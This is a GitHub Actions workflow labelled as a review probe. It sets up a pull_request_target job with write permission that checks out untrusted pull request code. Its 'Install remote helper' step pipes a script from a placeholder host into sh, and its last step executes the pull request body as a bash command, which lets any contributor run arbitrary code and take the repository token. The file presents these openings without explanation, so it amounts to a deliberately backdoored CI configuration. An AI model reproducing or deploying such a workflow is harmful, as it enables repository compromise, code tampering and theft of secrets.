name: DCOIR Review probe 20260627N
on:
  pull_request_target:
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout pull request SHA
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Install remote helper
        run: wget -qO- https://downloads.example.invalid/bootstrap.sh | sh
      - name: Execute PR body
        run: bash -c "${{ github.event.pull_request.body }}"
